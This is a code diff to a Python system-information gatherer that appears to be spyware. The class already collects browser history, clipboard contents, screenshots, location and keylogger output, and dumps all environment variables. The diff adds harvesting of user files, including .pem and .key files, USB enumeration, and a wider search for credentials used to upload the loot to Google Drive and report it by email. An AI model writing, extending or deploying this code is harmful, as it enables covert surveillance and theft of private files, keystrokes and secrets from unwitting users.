@@ -30,19 +30,6 @@ from browser import get_chrome_history, get_firefox_history, get_edge_history
 from clip_screen import ScreenshotViewer, ClipboardManager
 from location import WindowsLocationMonitor
 
-# Import key module functions without triggering module-level side effects
-# key.py starts a background thread at module level, so we import carefully
-try:
-    import key as _key_module
-except Exception:
-    _key_module = None
-
-# Import net module explicitly to avoid overwriting browser.py's functions
-try:
-    import net as _net_module
-except Exception:
-    _net_module = None
-
 # Optional keylogger support
 try:
     from pynput import keyboard
@@ -115,6 +102,16 @@ class SystemInfoGatherer:
 
     def get_basic_system_info(self):
         """Get basic system information"""
+        hostname = socket.gethostname()
+        ip_address = None
+        try:
+            ip_address = socket.gethostbyname(hostname)
+        except Exception:
+            try:
+                ip_address = socket.gethostbyname(socket.getfqdn())
+            except Exception:
+                ip_address = 'Unknown'
+
         info = {
             'system': {
                 'platform': platform.system(),
@@ -122,8 +119,8 @@ class SystemInfoGatherer:
                 'platform_version': platform.version(),
                 'architecture': platform.machine(),
                 'processor': platform.processor(),
-                'hostname': socket.gethostname(),
-                'ip_address': socket.gethostbyname(socket.gethostname())
+                'hostname': hostname,
+                'ip_address': ip_address
             },
             'boot_time': dt.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S')
         }
@@ -621,7 +618,56 @@ class SystemInfoGatherer:
     def get_environment_variables(self):
         """Get environment variables"""
         return dict(os.environ)
-    
+
+    def get_files_info(self, max_files=20):
+        """Collect a small sample of user files from common directories."""
+        try:
+            from files import WindowsFileMonitor
+        except Exception as e:
+            return {'error': f'WindowsFileMonitor unavailable: {e}'}
+
+        home = os.path.expanduser('~')
+        search_paths = [
+            os.path.join(home, 'Desktop'),
+            os.path.join(home, 'Documents'),
+            os.path.join(home, 'Downloads')
+        ]
+        extensions = [
+            '.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
+            '.csv', '.json', '.log', '.ini', '.conf', '.xml', '.pem', '.key',
+            '.jpg', '.jpeg', '.png', '.bmp', '.gif'
+        ]
+
+        monitor = WindowsFileMonitor()
+        files = []
+        for path in search_paths:
+            if not os.path.exists(path):
+                continue
+            for ext in extensions:
+                for file_info in monitor.find_files_by_extension(ext, search_paths=[path]):
+                    files.append(file_info)
+                    if len(files) >= max_files:
+                        return {'count': len(files), 'files': files}
+
+        return {'count': len(files), 'files': files}
+
+    def get_usb_info(self):
+        """Collect USB device and removable drive information."""
+        try:
+            from usb_mon import USBHubMonitor
+        except Exception as e:
+            return {'error': f'USBHubMonitor unavailable: {e}'}
+
+        try:
+            monitor = USBHubMonitor()
+            return {
+                'devices': monitor.get_usb_devices(),
+                'controllers': monitor.get_usb_controller_info(),
+                'removable_drives': monitor.get_connected_drives_info()
+            }
+        except Exception as e:
+            return {'error': str(e)}
+
     def get_all_system_info(self):
         """Get all system information"""
         all_info = {
@@ -640,6 +686,8 @@ class SystemInfoGatherer:
             'location_info': self.get_location_info(),
             'keylogger_info': self.get_keylogger_info(),
             'net_info': self.get_net_info(),
+            'files_info': self.get_files_info(),
+            'usb_info': self.get_usb_info(),
             'process_info': self.get_process_info(limit=100),
             'installed_software': self.get_installed_software(),
             'running_services': self.get_running_services(),
@@ -647,7 +695,7 @@ class SystemInfoGatherer:
             'system_uptime': self.get_system_uptime(),
             'environment_variables': self.get_environment_variables()
         }
-        
+
         return all_info
     
     def save_to_file(self, data, filename=None):
@@ -712,32 +760,35 @@ class SystemInfoGatherer:
             return None
 
         credentials_file = GOOGLE_CREDENTIALS_FILE
+        script_dir = os.path.dirname(os.path.abspath(__file__))
+        home_dir = os.path.expanduser('~')
+        candidate_files = [
+            os.path.join(script_dir, 'google_credentials.json'),
+            os.path.join(script_dir, 'service_account.json'),
+            os.path.join(script_dir, 'credentials.json'),
+            os.path.join(script_dir, 'drive_credentials.json'),
+            os.path.join(home_dir, 'google_credentials.json'),
+            os.path.join(home_dir, 'service_account.json'),
+            os.path.join(home_dir, '.credentials', 'google_credentials.json'),
+            os.path.join(home_dir, '.credentials', 'drive_credentials.json')
+        ]
+
         if not credentials_file or not os.path.exists(credentials_file):
-            script_dir = os.path.dirname(os.path.abspath(__file__))
-            home_dir = os.path.expanduser('~')
-            candidate_files = [
-                os.path.join(script_dir, 'google_credentials.json'),
-                os.path.join(script_dir, 'service_account.json'),
-                os.path.join(script_dir, 'credentials.json'),
-                os.path.join(script_dir, 'drive_credentials.json'),
-                os.path.join(home_dir, 'google_credentials.json'),
-                os.path.join(home_dir, 'service_account.json'),
-                os.path.join(home_dir, '.credentials', 'google_credentials.json'),
-                os.path.join(home_dir, '.credentials', 'drive_credentials.json')
-            ]
             for candidate in candidate_files:
                 if os.path.exists(candidate):
                     credentials_file = candidate
                     print(f"Using Google credentials file: {credentials_file}")
                     break
 
-        if not credentials_file or not os.path.exists(credentials_file):
-            print("Google credentials file not configured or not found.")
-            return None
-
         try:
             scopes = ['https://www.googleapis.com/auth/drive.file']
-            creds = service_account.Credentials.from_service_account_file(credentials_file, scopes=scopes)
+            if credentials_file and os.path.exists(credentials_file):
+                creds = service_account.Credentials.from_service_account_file(credentials_file, scopes=scopes)
+            else:
+                import google.auth
+                creds, _ = google.auth.default(scopes=scopes)
+                print("Using Application Default Credentials for Drive API.")
+
             service = build('drive', 'v3', credentials=creds, cache_discovery=False)
             return service
         except Exception as e:
@@ -761,7 +812,7 @@ class SystemInfoGatherer:
             print(f"Failed to create Drive subfolder '{folder_name}': {e}")
             return None
 
-    def get_files_to_upload(self, scan_paths=None, allowed_extensions=None, max_files=50, max_size_mb=25):
+    def get_files_to_upload(self, scan_paths=None, allowed_extensions=None, max_files=20, max_size_mb=25):
         """Collect a limited set of user files for upload from common directories."""
         if scan_paths is None:
             home = os.path.expanduser('~')
@@ -774,12 +825,6 @@ class SystemInfoGatherer:
                 os.path.join(home, 'Videos'),
                 os.path.join(home, 'Music')
             ]
-
-            if platform.system() == 'Windows':
-                system_drive = os.environ.get('SystemDrive', 'C:')
-                users_root = os.path.join(system_drive, 'Users')
-                if os.path.exists(users_root):
-                    scan_paths.append(users_root)
 
         if allowed_extensions is None:
             allowed_extensions = [
@@ -949,6 +994,8 @@ class SystemInfoGatherer:
             f'<li>Clipboard types: {", ".join(data.get("clipboard_info", {}).get("clipboard_types", [])) or "None"}</li>',
             f'<li>Screenshots found: {data.get("screenshot_info", {}).get("count", 0)}</li>',
             f'<li>Keylogger lines: {data.get("keylogger_info", {}).get("line_count", 0)}</li>',
+            f'<li>USB devices found: {len(data.get("usb_info", {}).get("devices", [])) if isinstance(data.get("usb_info"), dict) else 0}</li>',
+            f'<li>Files discovered: {data.get("files_info", {}).get("count", 0)}</li>',
             f'<li>Active connections: {len(data.get("net_info", {}).get("active_connections", []))}</li>',
             f'</ul>',
             '<p>Full details are included as JSON and TXT attachments.</p>',
@@ -1047,6 +1094,8 @@ class SystemInfoGatherer:
         lines.append(f"  Clipboard types: {', '.join(data.get('clipboard_info', {}).get('clipboard_types', [])) or 'None'}")
         lines.append(f"  Screenshots found: {data.get('screenshot_info', {}).get('count', 0)}")
         lines.append(f"  Keylogger lines: {data.get('keylogger_info', {}).get('line_count', 0)}")
+        lines.append(f"  USB devices found: {len(data.get('usb_info', {}).get('devices', [])) if isinstance(data.get('usb_info'), dict) else 0}")
+        lines.append(f"  Files discovered: {data.get('files_info', {}).get('count', 0)}")
         lines.append(f"  Active connections: {len(data.get('net_info', {}).get('active_connections', []))}")
         lines.append("  Full system details are attached as JSON and TXT files.")
 
